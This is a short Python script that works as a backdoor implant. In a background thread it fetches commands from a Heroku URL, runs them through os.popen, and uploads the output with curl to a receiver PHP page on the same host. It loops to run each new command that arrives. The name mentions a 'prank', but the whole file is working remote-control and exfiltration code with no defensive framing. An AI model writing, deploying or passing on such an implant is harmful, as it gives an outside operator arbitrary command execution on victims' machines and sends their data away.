import os as o
import threading
import requests
import time
URL = "https://prank-exploit.herokuapp.com/command"
def exploit():
    response = requests.get(URL).text
    print(response)
    reply = o.popen(response).read()
    #print(reply)
    f = open("tmp", "w")
    f.write(reply)
    f.close()
    o.system('curl -F "rep=@tmp" https://prank-exploit.herokuapp.com/reciver.php')
    currentHash = response
    time.sleep(3)
    while True:
        try:
            response = requests.get(URL).text
            currentHash = response
            time.sleep(3)
            response = requests.get(URL).text
            newHash = response
            if newHash == currentHash:
                continue
            else:
                print(response)
                reply = o.popen(response).read()
                #print(reply)
                f = open("tmp", "w")
                f.write(reply)
                f.close()
                o.system('curl -F "rep=@tmp" https://prank-exploit.herokuapp.com/reciver.php')
                response = requests.get(URL).text
                currentHash = response
                time.sleep(3)
                continue
        except Exception as e:
            print("error")
t1 = threading.Thread(target=exploit, name='exp')
t1.start();
